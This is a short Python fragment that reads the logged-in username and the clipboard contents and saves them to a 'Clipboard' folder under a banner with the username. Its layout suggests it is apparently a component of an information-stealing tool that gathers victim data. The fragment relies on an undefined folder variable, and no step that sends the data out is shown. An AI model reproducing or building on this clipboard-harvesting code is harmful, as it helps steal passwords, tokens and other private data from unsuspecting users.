import pyperclip
import os

user = os.getlogin()
clipboard = pyperclip.paste()

os.makedirs(fr"{foldername}\Clipboard")

with open(fr"{foldername}\Clipboard\clipboard.txt", "w", encoding='utf-8') as file:
    file.write(f"<========================[ {user} ]========================>\n\nCLIPBOARD : {clipboard}")
